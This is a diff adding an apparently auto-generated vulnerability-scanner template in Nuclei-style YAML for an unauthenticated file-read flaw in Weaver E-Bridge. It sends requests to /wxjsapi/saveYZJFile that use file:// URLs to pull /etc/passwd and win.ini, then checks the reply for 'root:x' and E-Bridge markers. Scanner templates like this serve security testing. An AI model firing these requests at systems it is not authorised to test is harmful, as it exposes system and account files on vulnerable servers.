@@ -1,0 +1,27 @@
+# 自动生成：tools/import_ref_pocs.py，请勿手工编辑（重跑会覆盖）
+id: ref-e-bridge-unauth_readfile
+info:
+  name: "E-Bridge unauth_readfile"
+  author: imported-from-myscan
+  severity: high
+  tags: [imported, e-bridge, ref-poc, readfile]
+  description: "由参考项目脚本静态导入：E-Bridge/unauth_readfile（类型 READFILE）。"
+http:
+  - method: GET
+    path:
+      - "/"
+      - "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///C://windows/win.ini&fileExt=txt"
+      - "/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status: [200]
+      - type: word
+        part: body
+        condition: or
+        words:
+          - "<meta name=\"searchtitle\" content=\"泛微云桥e-Bridge\">"
+          - "content=\"泛微云桥e-bridge\""
+          - "wx.weaver"
+          - "e-Bridge"
+          - "root:x"
